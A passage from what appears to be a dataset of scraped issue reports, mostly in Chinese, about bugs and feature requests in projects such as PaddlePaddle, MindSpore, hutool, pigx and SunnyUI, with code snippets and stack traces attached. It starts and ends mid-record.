0x4eaaf1 PyRun_SimpleFileExFlags @ 0x49e208 Py_Main @ 0x7f511d6a6830 __libc_start_main @ 0x49da59 _start @ 0x0 (unknown)"
1.7.5版本put和get请求接口并不能正常显示,"你好，作者： 我再此反馈一个bug，在doc.html路径下的页面忽略了部分接口 ![源码]https://images.gitee.com/uploads/images/2018/0801/100105_f3bfe9dd_2080590.jpeg ""swaggerbug.jpg"") ![doc-old下的显示]https://images.gitee.com/uploads/images/2018/0801/100842_1e6662a2_2080590.jpeg ""swaggerbug3.jpg"")   <code>: 附上我的源码，我的设置可以使swagger2正常扫描到我的接口，我使用的swagger2版本为2.6.1 值得一提的是，我在之前的提问中发现了doc-old.html这个在文档中没有提到的路径。在这个路径下，我的接口可以正常显示。但是在doc下并不能被显示，由此我推测这应当是个bug，麻烦作者根据问题给出一个可解决这个bug的办法。"
关于tree的启用问题,这里会影响到启用问题，如果把所有子节点与父节点都停用了，再启用父节点会看不到子节点，但是启动父节点时会启用所有子节点。   <code>: UPDATE js_sys_office SET tree_leaf = ( SELECT (case when count(1) &gt; 0 then '0' else '1' end) tree_leaf FROM (SELECT parent_code FROM js_sys_office WHERE status = '0') b WHERE b.parent_code = #{officeCode} ) WHERE office_code = #{officeCode}
markdown导出api存在超过2层级的时候子文档不显示,"toMarkdownByData(docInfoList, title) { //下面的代码只能处理2层目录,如果需要的话我这里提交一个pr，您看一下 treeData.forEach(docInfo =&gt; { const children = docInfo.children const isFolder = children &amp;&amp; children.length &gt; 0 if (isFolder) { console.log() markdown_content.append() children.forEach(child =&gt; { appendMarkdown(child) }) } else { appendMarkdown(docInfo) } }) return markdown_content.toString() },   <code>: title = title || $ts('document') const treeData = convert_tree(docInfoList) const markdown_content = new StringBuilder(`# ${title}\n\n`) const appendMarkdown = (doc_info) =&gt; { init_docInfo(doc_info) const markdown = MarkdownUtil.toMarkdown(doc_info) markdown_content.append(markdown) } ${docInfo.name} is folder ## ${docInfo.name}\n\n"
改进CronPatternUtil.nextDateAfter性能,现有方法采用“走秒”的方式获取下一个时间点，效率非常差，参考实现基于表达式分析的方法。 参考见：https://github.com/dromara/hutool/pull/2146   <code>: CronPatternUtil.nextDateAfter Quartz
通过域名代理tcp端口,参考来源==》https://blog.csdn.net/diyiday/article/details/107062662 希望博主可以提供通过域名来代理tcp的功能，蟹蟹   <code>: stream { map $ssl_preread_server_name $name { mysql.test.com mysql; redis.test.com redis; default https_default_backend; } upstream mysql{ server 10.0.0.3:3306; } upstream redis{ server 10.0.0.4:6379; } upstream https_default_backend { server 127.0.0.1:443; } server { listen 10.0.0.1:443; proxy_pass $name; ssl_preread on; } }
FLAGS_rpc_deadline has no effect,has no effect for rpc_client.   <code>: export FLAGS_rpc_deadline=12345
keras生成的lstm模型转成paddle后，存在精度上小数点后两位的差异,"如题，用keras生成lstm模型后，将参数set到对应的paddle模型，两个模型的预测结果总是存在小数点后两位的差异；由于整体的网络结构比较深，会对最终的效果产生一定影响。 代码如下：   <code>: #!/usr/bin/env python # coding: utf-8 from keras import backend as K from keras.models import Model from keras.layers import Layer, Conv2D, TimeDistributed, Flatten, Concatenate, LSTM, Input import numpy as np import keras import paddle import paddle.fluid as fluid import paddle.fluid.core as core import paddle.fluid.framework as framework from paddle.fluid.executor import Executor ### keras pattern_timeseries = Input((3, 2)) pattern_timeseries_lstm = LSTM(20, return_sequences=True,return_state=False)(pattern_timeseries) model = Model(pattern_timeseries, pattern_timeseries_lstm) input_demo = np.array([[[10,30],[20,40],[10,11]]]) keras_result = model.predict(input_demo) lstm_kernel = K.get_session().run(model.weights[0]) lstm_recurrent_kernel = K.get_session().run(model.weights[1]) lstm_bias = K.get_session().run(model.weights[2]) # print(lstm_kernel.shape) # print(lstm_recurrent_kernel.shape) # print(lstm_bias.shape) ### paddle shape = [2] gate_size = 20 data = fluid.layers.data(name='data', shape=shape, dtype='float32') input_forward_proj = fluid.layers.fc(name='fc_0',input=data, size=gate_size * 4, act=None, bias_attr=False) forward, state = fluid.layers.dynamic_lstm( name='lstm_0', input=input_forward_proj, size=gate_size * 4,use_peepholes=False) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) scope = fluid.global_scope() ### set weights gate_size = int(lstm_kernel.shape[1] / 4) # print(gate_size) lstm_kernel_bak = np.copy(lstm_kernel) lstm_kernel[:,:gate_size] = lstm_kernel_bak[:,gate_size*2:gate_size*3]#W_c lstm_kernel[:,gate_size*1:gate_size*2] = lstm_kernel_bak[:,:gate_size*1]#W_i lstm_kernel[:,gate_size*2:gate_size*3] = lstm_kernel_bak[:,gate_size*1:gate_size*2]#W_f lstm_kernel[:,gate_size*3:gate_size*4] = lstm_kernel_bak[:,gate_size*3:gate_size*4]#W_o scope.find_var('fc_0.w_0').get_tensor().set(lstm_kernel,fluid.CPUPlace()) gate_size = int(lstm_recurrent_kernel.shape[1] / 4) lstm_recurrent_kernel_bak = np.copy(lstm_recurrent_kernel) lstm_recurrent_kernel[:,:gate_size] = lstm_recurrent_kernel_bak[:,gate_size*2:gate_size*3]#W_c lstm_recurrent_kernel[:,gate_size*1:gate_size*2] = lstm_recurrent_kernel_bak[:,:gate_size*1]#W_i lstm_recurrent_kernel[:,gate_size*2:gate_size*3] = lstm_recurrent_kernel_bak[:,gate_size*1:gate_size*2]#W_f lstm_recurrent_kernel[:,gate_size*3:gate_size*4] = lstm_recurrent_kernel_bak[:,gate_size*3:gate_size*4]#W_o scope.find_var('lstm_0.w_0').get_tensor().set(lstm_recurrent_kernel,fluid.CPUPlace()) gate_size = int(lstm_bias.shape[0] / 4) lstm_bias = lstm_bias.reshape(1,-1) lstm_bias_bak = np.copy(lstm_bias) lstm_bias[:,:gate_size] = lstm_bias_bak[:,gate_size*2:gate_size*3]#W_c lstm_bias[:,gate_size*1:gate_size*2] = lstm_bias_bak[:,:gate_size*1]#W_i lstm_bias[:,gate_size*2:gate_size*3] = lstm_bias_bak[:,gate_size*1:gate_size*2]#W_f lstm_bias[:,gate_size*3:gate_size*4] = lstm_bias_bak[:,gate_size*3:gate_size*4]#W_o scope.find_var('lstm_0.b_0').get_tensor().set(lstm_bias,fluid.CPUPlace()) ### paddle predict def to_lodtensor(data, place): size = len(data[0][0]) seq_lens = [len(seq) for seq in data] cur_len = 0 lod = [cur_len] for l in seq_lens: cur_len += l lod.append(cur_len) flattened_data = np.concatenate(data, axis=0).astype(""float32"") print(flattened_data) res = fluid.LoDTensor() res.set(flattened_data, place) res.set_lod([lod]) print([lod]) return res inputs = to_lodtensor(input_demo, place) results = exe.run(fluid.default_main_program(), feed={'data':inputs}, fetch_list=[forward],return_numpy=False) paddle_output = np.array(results[0]) print(""\npaddle_ouput:\n"") print(paddle_output) print(""\nkeras_ouput:\n"") print(keras_result) print(""\ndiff:\n"") print(keras_result - paddle_output)"
set_lod时报错paddle.fluid.core.EnforceNotMet: the provided lod info is invalid at [/paddle/paddle/fluid/pybind/pybind.cc:449],"paddle版本：Fluid1.4 latest 环境：centos 6u3 设置特征lod时报错： to_lodtensor函数如下： 特征是类似nlp的变长序列，之前使用0.11版本的paddle时用这个函数设置lod没有问题，改为最新版fluid后报错。报错时expand_res.set_lod([lod,expand_lod]) 中装填的lod信息为[[0, 2], [0, 2, 4]]   <code>: File ""keras_2_fluid_all_part_map_diff_direction2_fix_multi_sum_output2.py"", line 372, in &lt;module&gt; lod_tensor,lod_attention = to_lodtensor(d, place) File ""keras_2_fluid_all_part_map_diff_direction2_fix_multi_sum_output2.py"", line 356, in to_lodtensor expand_res.set_lod([lod,expand_lod]) paddle.fluid.core.EnforceNotMet: the provided lod info is invalid at [/paddle/paddle/fluid/pybind/pybind.cc:449] PaddlePaddle Call Stacks: 0 0x7f42e0b9e072p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 354 1 0x7f42e0b9e3f6p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 134 2 0x7f42e0b92e69p 3 0x7f42e0bcd5fcp 4 0x7f4311e9e3e4p PyEval_EvalFrameEx + 25956 5 0x7f4311e9dc56p PyEval_EvalFrameEx + 24022 6 0x7f4311e9f130p PyEval_EvalCodeEx + 2240 7 0x7f4311e9f242p PyEval_EvalCode + 50 8 0x7f4311eb962cp 9 0x7f4311eb9700p PyRun_FileExFlags + 144 10 0x7f4311ebac0cp PyRun_SimpleFileExFlags + 220 11 0x7f4311ecc4ccp Py_Main + 3164 12 0x318ae1ecddp __libc_start_main + 253 13 0x400659p def to_lodtensor(data, place): size = len(data[0][0]) seq_lens = [len(seq) for seq in data] cur_len = 0 lod = [cur_len] for l in seq_lens: cur_len += l lod.append(cur_len) flattened_data = np.concatenate(data, axis=0).astype(""float32"") res = fluid.LoDTensor() res.set(flattened_data, place) res.set_lod([lod]) expand_lod = [] for i in range(0,cur_len+1): expand_lod.append(i*cur_len) expand_res = fluid.LoDTensor() expand_res.set( np.zeros((1,size),dtype=np.float32), place) print ""set_lod: "",[lod,expand_lod] expand_res.set_lod([lod,expand_lod]) return res,expand_res"
Slight change to Tensor methods,Slight change to some Tensor methods from to so that we can write and   <code>: inline void Resize(const DDim&amp; dims); inline void ShareDataWith(const Tensor&amp; src); inline Tensor&amp; Resize(const DDim&amp; dims); inline Tensor&amp; ShareDataWith(const Tensor&amp; src); return LODTensor(lod_.Slice(...)).ShareDataWith(*this); tensor.Resize(new_dim).mutable_data&lt;float&gt;(...);
使用Fluid对图像变长数据多次训练/预测存在的问题,"Fluid构建一个网络分为两个过程：和 对于变长数据的预测过程可以分为以下两步： 过程Fluid根据Python输入data_const的shape计算得到,根据输入data的shape计算得到各个Var的shape 根据实际feed的data_real进行计算，如果输入是变长数据，data_real与data_const的shape不同，可能会引起一些op的错误 已经发现的问题 目标检测相关的一些Reshape API使用的是输入的shape，所以在输入变长数据时会出错 ReshapeOp相关的一些： https://github.com/PaddlePaddle/Paddle/blob/9e0a94f069329b430d0843327e474712e079a660/python/paddle/fluid/layers/detection.py#L266-L268 https://github.com/PaddlePaddle/Paddle/blob/9e0a94f069329b430d0843327e474712e079a660/python/paddle/fluid/layers/detection.py#L679-L680 https://github.com/PaddlePaddle/Paddle/blob/edc32c089605944eda860e3404f8aff152a4ff38/python/paddle/fluid/layers/detection.py#L691 https://github.com/PaddlePaddle/Paddle/blob/9e0a94f069329b430d0843327e474712e079a660/python/paddle/fluid/layers/detection.py#L1009-L1012 https://github.com/PaddlePaddle/Paddle/blob/edc32c089605944eda860e3404f8aff152a4ff38/python/paddle/fluid/layers/detection.py#L1102-L1106 https://github.com/PaddlePaddle/Paddle/blob/9e0a94f069329b430d0843327e474712e079a660/python/paddle/fluid/layers/detection.py#L1118-L1122   <code>: compile time run time Compile time ProgramDesc Run time Compile time"
pig使用diy下载新模块,pig版本:3.4.7 是否修改包名: 是 2、模块名称的长度也有限制   <code>: 1、pig使用diy新模块，模块名称里面不能有-
Input size in GRU operator,"I'm working on integrating MKLDNN GRU primitive in PaddlePaddle. I would like to clarify my issue understanding format and size of Input tensor. In the comment below: https://github.com/PaddlePaddle/Paddle/blob/83c85f34e84d5bae22d374374408de780d10ae21/paddle/fluid/operators/gru_op.cc#L75-L79 is a length of the longest sequence in the batch, or is it the sum of lengths of all the sequences in the batch?   <code>: total time step"
 IoUtil.read输出流没有关闭,"JDK版本： oracleJDK 1.8 hutool版本： 5.4.6 IoUtil.read里的FastByteArrayOutputStream流没有关闭   <code>: Future&lt;String&gt; future = executor.submit(new Callable&lt;String&gt;() { @Override public String call() throws Exception { return IoUtil.read(inputStream, ""UTF-8""); } });"
[CT][MS][OCCM][unsortedsegmentprod]算子在gpu出现RuntimeError: Launch kernel failed: Default/UnsortedSegmentProd-op365,"算子在gpu运行 用例test_p_unsortedsegmentprod_input_3x3_segments_0x1x1_numseg_1 出现报错 def test_p_unsortedsegmentprod_input_3x3_segments_0x1x1_numseg_1(): input1 = np.array([[1, 2, 3], [4, 5, 6], [4, 2, 1]]).astype(np.int32) segments = np.array([0, 1, 1]).astype(np.int32) num_segments = 1 net = UnsortedSegmentProd(num_segments) fact = AnyNetFactory(net=net) test_unsortedsegmentprod.py:184: ../share/meta.py:818: in call return self.net(*args) ../share/utils.py:199: in call out = super().call(*args, **kwargs) /root/miniconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:620: in call out = self.compile_and_run(*args) /root/miniconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_ru return _cell_graph_executor(self, *new_inputs, phase=self.phase) /root/miniconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/common/api.py:1434: in call return self.run(obj, *args, phase=phase) /root/miniconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/common/api.py:1471: in run return self._exec_pip(obj, *args, phase=phase_real) /root/miniconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f35ea151990&gt;, obj = WrapOp&lt;&gt; phase = 'train.1668416122461606400.139856164761424.17' args = (Tensor(shape=[3, 3], dtype=Int32, value= [[1, 2, 3], [4, 5, 6], [4, 2, 1]]), Tensor(shape=[3], dtype=Int32, value= [0, 1, 1])) fn = &lt;bound method UnsortedSegmentProd.construct of WrapOp&lt;&gt;&gt; E RuntimeError: Launch kernel failed: Default/UnsortedSegmentProd-op365 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:634 Run /root/miniconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/common/api.py:1453: RuntimeError ---------------------------------------------- Captured stdout call ----------------------------------- / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_unsortedsegmentprod_input_3x3_segments_0x1x1_numseg_1 test_p_unsortedsegmentprod_input_3x4_segments_2x1x4_numseg_2 test_vmap_unsortedsegmentprod_128   <code>: out1 = fact(Tensor(input1), Tensor(segments)) @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct obj.__parse_method__ = fn.__name__ return self._graph_executor(args, phase)"
UIHeaderAsideMainFrame导致缩放问题 使用2个子菜单3.0.9和3.1.0缩放故障！（3.0.8正常工作）,"SunnyUI 版本号 3.0.9 SunnyUI 引用来源 NuGet 操作系统 Win10 如果是1902*1080环境暂无发现该问题！   <code>: parent = Aside.CreateNode(""精准测风"", 61451, 24, pageIndex); //通过设置PageIndex关联，节点文字、图标由相应的Page的Text、Symbol提供 //可以自行通过事件示例处理 移除订阅消息 目前全局报警提示也没什么 Aside.CreateChildNode(parent, AddPage(new FormRealTimeData(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormHistoryData(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormHistoryChart(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormHistoryAlarm(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormDevice(), ++pageIndex)); Constant.initForm(this); //所有菜单索引 后续考虑枚举 TreeNode parent = Aside.CreateNode(""系统"", 61451, 24, pageIndex); Aside.CreateChildNode(parent, AddPage(new FormIpData(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormDeviceAddress(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormUserInfoV2(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormSimulateData(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormSetting(), ++pageIndex)); parent = Aside.CreateNode(""精准测风"", 61451, 24, pageIndex); //通过设置PageIndex关联，节点文字、图标由相应的Page的Text、Symbol提供 //可以自行通过事件示例处理 移除订阅消息 目前全局报警提示也没什么 Aside.CreateChildNode(parent, AddPage(new FormRealTimeData(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormHistoryData(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormHistoryChart(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormHistoryAlarm(), ++pageIndex)); Aside.CreateChildNode(parent, AddPage(new FormDevice(), ++pageIndex)); //parent = Aside.CreateNode(""风门"", 61451, 24, pageIndex); ////通过设置PageIndex关联，节点文字、图标由相应的Page的Text、Symbol提供 //Aside.CreateChildNode(parent, AddPage(new FormRealTimeData(), ++pageIndex)); //Aside.CreateChildNode(parent, AddPage(new FormHistoryData(), ++pageIndex)); //Aside.CreateChildNode(parent, AddPage(new FormHistoryChart(), ++pageIndex)); //Aside.CreateChildNode(parent, AddPage(new FormHistoryAlarm(), ++pageIndex)); //Aside.CreateChildNode(parent, AddPage(new FormDevice(), ++pageIndex)); //Aside.ExpandAll(); } private void FMain1_FormClosing(object sender, FormClosingEventArgs e) { //var result = UIMessageBox.Show(""你确定要退出程序吗?"", ""操作提示"", UIStyle.Blue, UIMessageBoxButtons.OKCancel); //if (result) //{ // //System.Environment.Exit(0); // this.Close(); //} //else //{ // e.Cancel = true; // this.WindowState = FormWindowState.Minimized; //} } private void FMain1_Load(object sender, EventArgs e) { var time = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss""); this.Text = $""远安县疾控中心核酸检测管理系统""; //DBContext dbContext = new DBContext(); // var res=dbContext.Set&lt;PCRInfo&gt;().Where(s =&gt; 1 == 1).ToList(); } }"
English version of document is needed,"In the model page of English paddle website, several links refers to documents written in Chinese. Need to create documents in English for the following: Hsigmoid加速词向量训练 使用噪声对比估计加速语言模型训练 使用循环神经网语言模型生成文本 文本分类 For this one, the text that provides the link is , which should be fixed to 排序学习 命名实体识别 图像分类 convert Caffe model file to PaddlePaddle model file convert TensorFlow model file to PaddlePaddle model file   <code>: Sentiment analysis based on DNN / CNN Text classification based on DNN / CNN"
单点登录sso下多租户问题,"环境信息 pigx版本:3.10 是否修改包名:否 跳转sso认证服务器地址时，未经过网关，所以ttl中租户id是为空的 在认证登录时，client校验会出错，demo工程未报错的原因还是那个filter默认设置了租户1 PigxClientDetailsServiceImpl   <code>: @Override @Cacheable(value = CacheConstants.CLIENT_DETAILS_KEY, key = ""#clientId"", unless = ""#result == null"") public ClientDetails loadClientByClientId(String clientId) { super.setSelectClientDetailsSql( String.format(SecurityConstants.DEFAULT_SELECT_STATEMENT, TenantContextHolder.getTenantId())); return super.loadClientByClientId(clientId); }"
The print op cannot support dynamic multiple input in model.train,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : The print op cannot support dynamic multiple input in model.train() In train mode, the print op should support dynamic multiple input   <code>: def construct(self, x): self.Printm(""-----start----------:"") x = self.conv1(x) ...... #error self.Printm(""---test---------------:"", x) self.Printm(x)"
table序号每页从1开始的问题,"在不排序的情况下是正常的   <code>: { title: '行号',templet:'#taxTableRowNo',width:60} &lt;script type=""text/html"" id=""taxTableRowNo""&gt; {{ d.LAY_TABLE_INDEX+1}} &lt;/script&gt;"
Fluid with distribution can not run rightly when batch_size is too small,"I think there are questions about our trainer start-up mechanisms @Yancey @typhoonzero. At present, trainer starts to run only base on judge whether the pserver process exists, when the batch_size is too small, It will send gradient to pserver before pserver is ready to receive, that may throw the exception.   <code>: E0413 05:42:53.977813 2453 grpc_client.cc:234] proc param error:name:[fc_26.b_0@GRAD] ep:[127.0.0.1:36001] grpc error:Connect Failed"
[CT][MS][OP]LuSolve operator acceptance problems.,": Ascend CPU /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : test_lusolve_input_x_batch_1d_lu_data_batch_2d_not_consistent test_lusolve_input_lu_data_batch_lu_pivots_batch_diff test_lusolve_input_5d_3d_fp16 test_lusolve_input_5d_fp16 Doc文档说明中，Raises需修改部分： TypeError: If dtype of is not one of: float32, float16.需加上or lu_data TypeError: If , and are not Tensor.应改为：If , or is not Tensor. x和lu_data、lu_pivots的shape大小限制关系请在input：中说明清楚 算子不支持0d和1d的输入，资料需在Raises加上报错说明，代码里需加上校验及提示信息。 Note说明中需增加： x batch dimension和lu_data batch dimension的限制关系 Raises中需增加：x dtype 与 lu_data dtype必须一致 CPU环境： pytest -s -v test_lusolve.py::test_lusolve_input_x_batch_1d_lu_data_batch_2d_not_consistent 报错信息应改为：x中batch dimension为（3），lu_data中batch dimension为（2,4） 7.pytest -s -v test_lusolve.py::test_lusolve_input_lu_data_batch_lu_pivots_batch_diff 报错信息中lu_data和lu_pivots的batch dimension不对， LU_data和lu_data大小写统一 <ol start=""8""> 用例执行core dump test_lusolve_input_5d_3d_fp16 test_lusolve_input_5d_fp16   <code>: x x lu_data lu_pivots x lu_data lu_pivots def test_lusolve_input_x_batch_1d_lu_data_batch_2d_not_consistent(): x = np.random.randn(3, 3, 2).astype(np.float32) lu_data = np.random.randn(2, 4, 3, 3).astype(np.float32) lu_pivots = np.random.randn(2, 4, 3).astype(np.int32) fact = LuSolveMock(inputs=[Tensor(x), Tensor(lu_data), Tensor(lu_pivots)]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: mindspore/core/ops/lu_solve_.cc:59 LuSolveInferShape] For LuSolve shapes in dim[0] are not the same while x is 3, lu_data is 2 E The function call stack (See file '/home/zhangting/1011code/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details): E # 0 In file /home/zhangting/1011code/MindSporeTest/share/ops/primitive/lusolve_ops.py(21) E return self.lu_solve(x, lu_data, lu_pivots) def test_lusolve_input_lu_data_lu_pivots_m_dim_diff(): x = np.random.randn(4, 4).astype(np.float32) lu_data = np.random.randn(4, 4).astype(np.float32) lu_pivots = np.random.randn(3).astype(np.int32) fact = LuSolveMock(inputs=[Tensor(x), Tensor(lu_data), Tensor(lu_pivots)]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: mindspore/core/ops/lu_solve_.cc:73 LuSolveInferShape] For LuSolve batch dimension of LU_pivots should match batch dimension of LU_data while lu_data is 4, lu_pivots is 3 E The function call stack (See file '/home/zhangting/1011code/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details): E # 0 In file /home/zhangting/1011code/MindSporeTest/share/ops/primitive/lusolve_ops.py(21) E return self.lu_solve(x, lu_data, lu_pivots) Fatal Python error: Aborted Thread 0x00007fdec4e6c740 (most recent call first): File ""/root/miniconda3/envs/zhangting/lib/pytAborted (core dumped) test_lusolve.py::test_lusolve_input_5d_fp16 Fatal Python error: Fatal Python error: Segmentation faultSegmentation fault Thread 0x00007f6d5dbd0740 (most recent call first): File ""/root/miniconda3/envs/zhangting/lib/python3.7/site-packages/mindspore/common/api.py"", line 639 in _exec_pip File ""/root/miniconda3/envs/zhangting/lib/pythoSegmentation fault (core dumped)"
TopK算子的属性sorted不起作用,": /device ascend : -- MindSpore version : r1.2 -- Python version : python3.7.5 -- OS platform and distribution : eulerosv2r8 -- GCC/Compiler version : 无论输入sorted属性是否为False，输出结果均做排序。 首先，topk默认输出描述不清楚，默认输出降序、升序还是不排序？文档并没有描述清楚。 其次，sorted属性true或false行为都是一致的。 sorted=False 时输出结果不做排序   <code>: import numpy as np from mindspore import Tensor import mindspore.ops as ops import mindspore.context as context context.set_context(device_target=""Ascend"", device_id=4) np.random.seed(1) x = np.random.randint(0, 10, 10).astype(np.float32) print(x) index, out = ops.TopK(sorted=False)(Tensor(x), 7) print(index, out) index, out = ops.TopK(sorted=True)(Tensor(x), 7) print(index, out)"
paddle中使用gpu这么简单？这样用对吗？,"pytorch中使用gpu，需要明确地将tensor转移到gpu： device = torch.device('cuda') # 用GPU来运行 a = a.to(device) b = b.to(device) paddle中使用gpu，勿需明确地将tensor转移到gpu： paddle.set_device(""gpu"") 完整的代码是：   <code>: import paddle import torch import numpy as np import time print(paddle.__version__) print(torch.__version__) x_data = np.random.random([10000, 10000]).astype(np.float32) y_data = np.random.random([10000, 10000]).astype(np.float32) x = paddle.to_tensor(x_data) y = paddle.to_tensor(y_data) a = torch.from_numpy(x_data) b = torch.from_numpy(y_data) #pytorch使用gpu device = torch.device('cuda') # 用GPU来运行 a = a.to(device) b = b.to(device) t0 = time.time() c = torch.matmul(a, b) t1 = time.time() t = t1 - t0 print(""pytorch gpu:"",t) #paddle使用gpu paddle.set_device(""gpu"") t0 = time.time() # 记录时间 paddle.matmul(x, y) t1 = time.time() # 记录时间 t = (t1 - t0) print(""paddle gpu:"",t)"
[ms]support ms_function inside general class,"RFC Use this template for requirement to be discussed Requirement Use this template for Confirmed requirements Backgroud（背景信息） Describe/Explain the status of the problem you wish to solve. Attach relevant issues if there is any. Origin（信息来源） Explain which department/team made this request so that its priority can be given. Benefit / Necessity （价值/作用） Describe/Explain the key value by fulfilling the request. Design（设计方案） Describe/Explain the general idea of the design. Pseudo-code is allowed   <code>: import numpy as np from mindspore import Tensor from mindspore import ms_function, ms_class, nn @ms_class class Net(): @ms_function def tst(self, x): return x*x x = Tensor([1.,2.]) net = Net() print(""out==============="", net.tst(x))"
GPU单机训练报错，GpuMemcpySync,"paddle版本为: gpu_1.4.1 place使用CUDAPlace(0)会报以下错误，使用CPUPlace正常训练 报错如下：   <code>: W0711 10:59:06.681474 47540 device_context.cc:261] Please NOTE: device: 0, CUDA Capability: 61, Driver API Version: 8.0, Runtime API Version: 8.0 W0711 10:59:06.684422 47540 device_context.cc:269] device: 0, cuDNN Version: 5.0. W0711 10:59:06.684448 47540 device_context.cc:293] WARNING: device: 0. The installed Paddle is compiled with CUDNN 5.1, but CUDNN version in your machine is 5.0, which may cause serious incompatible bug. Please recompile or reinstall Paddle with compatible CUDNN version. Traceback (most recent call last): File ""simNet.py"", line 297, in &lt;module&gt; op.train() File ""simNet.py"", line 291, in train train_loop(fluid.default_main_program()) File ""simNet.py"", line 217, in train_loop feed=dt, fetch_list=[model_layers['loss'], model_layers['acc'], model_layers['pred'], model_layers['label']]) File ""/home/shiyazhou/fluid_gpu_1.4_Env/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 565, in run use_program_cache=use_program_cache) File ""/home/shiyazhou/fluid_gpu_1.4_Env/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 642, in _run exe.run(program.desc, scope, 0, True, True, fetch_var_name) paddle.fluid.core.EnforceNotMet: Invoke operator fetch error. Python Callstacks: File ""/home/shiyazhou/fluid_gpu_1.4_Env/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 1654, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/shiyazhou/fluid_gpu_1.4_Env/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 360, in _add_feed_fetch_ops attrs={'col': i}) File ""/home/shiyazhou/fluid_gpu_1.4_Env/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 639, in _run fetch_var_name=fetch_var_name) File ""/home/shiyazhou/fluid_gpu_1.4_Env/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 565, in run use_program_cache=use_program_cache) File ""simNet.py"", line 217, in train_loop feed=dt, fetch_list=[model_layers['loss'], model_layers['acc'], model_layers['pred'], model_layers['label']]) File ""simNet.py"", line 291, in train train_loop(fluid.default_main_program()) File ""simNet.py"", line 297, in &lt;module&gt; op.train() C++ Callstacks: cudaMemcpy failed in paddle::platform::GpuMemcpySync (0x102182ee640 -&gt; 0x7f37a10b4040, length: 4): unspecified launch failure at [/paddle/paddle/fluid/platform/gpu_info.cc:280] PaddlePaddle Call Stacks: 0 0x7f37e7d1f840p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 352 1 0x7f37e7d1fbb9p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 137 2 0x7f37e9b9dfecp paddle::platform::GpuMemcpySync(void*, void const*, unsigned long, cudaMemcpyKind) + 188 3 0x7f37e7e91601p void paddle::memory::Copy&lt;paddle::platform::CPUPlace, paddle::platform::CUDAPlace&gt;(paddle::platform::CPUPlace, void*, paddle::platform::CUDAPlace, void const*, unsigned long, CUstream_st*) + 241 4 0x7f37e9b3dcf4p paddle::framework::TensorCopySync(paddle::framework::Tensor const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;, paddle::framework::Tensor*) + 916 5 0x7f37e95799b2p paddle::operators::FetchOp::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 626 6 0x7f37e9aaad5cp paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, 